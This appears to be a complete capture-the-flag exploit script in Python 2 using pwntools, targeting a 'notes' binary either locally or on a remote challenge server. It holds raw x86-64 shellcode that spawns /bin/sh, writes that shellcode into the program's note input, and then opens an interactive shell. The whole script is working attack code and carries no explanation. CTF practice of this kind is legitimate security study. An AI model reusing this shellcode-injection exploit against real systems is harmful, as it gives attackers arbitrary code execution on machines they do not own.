
from pwn import *
from time import sleep

context.binary = ELF('./notes')

debug = True
if not debug:
    p = remote('ncsc.ccis.no', 1344)
else:
    p = process(context.binary.path)


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"



p.send("navn\n")
print p.recvuntil('>')
p.send('1\n')
print p.recvuntil('?')
p.send('100\n')
print p.recvuntil(':')
p.send("{}\n".format(shellcode))

p.interactive()



